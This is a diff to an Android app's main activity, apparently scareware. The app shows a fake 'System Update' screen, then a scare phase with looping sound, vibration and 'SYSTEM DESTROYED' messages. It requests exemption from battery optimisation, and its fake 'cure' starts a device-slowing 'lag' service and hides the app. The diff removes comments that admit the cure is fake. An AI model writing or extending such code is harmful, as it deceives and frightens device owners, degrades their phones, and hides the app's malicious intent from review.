@@ -52,7 +52,6 @@ class MainActivity : AppCompatActivity() {
 
         setContentView(R.layout.activity_main)
 
-        // Ask ignore battery optimization
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
@@ -61,7 +60,7 @@ class MainActivity : AppCompatActivity() {
             }
         } catch (_: Exception) {}
 
-        // Show "System Update" for ~7 seconds so user can read it
+        // System Update screen stays ~7 seconds
         handler.postDelayed({
             showScarePhase()
         }, 7000)
@@ -74,7 +73,6 @@ class MainActivity : AppCompatActivity() {
         findViewById<LinearLayout>(R.id.updateScreen).visibility = View.GONE
         findViewById<View>(R.id.scareScreen).visibility = View.VISIBLE
 
-        // Sound
         try {
             mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
             mediaPlayer?.isLooping = true
@@ -98,7 +96,6 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {}
         }
 
-        // Vibrate
         try {
             val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -121,13 +118,11 @@ class MainActivity : AppCompatActivity() {
                 جارٍ التنظيف... 正在清理...
                 (لن يتوقف إلا بعد إلغاء تثبيت التطبيق)
             """.trimIndent()
-            // Fake only – still start lag service
             handler.postDelayed({
                 startLagAndHide()
             }, 2500)
         }
 
-        // Also auto-hide after some time even if they don't press cure
         handler.postDelayed({
             startLagAndHide()
         }, 25000)
@@ -165,7 +160,7 @@ class MainActivity : AppCompatActivity() {
             "⚠ SYSTEM DESTROYED ⚠"
         )
         val tv = findViewById<TextView>(R.id.scareText)
-        var i = pan 0
+        var i = 0
         handler.post(object : Runnable {
             override fun run() {
                 tv.text = messages[i % messages.size]
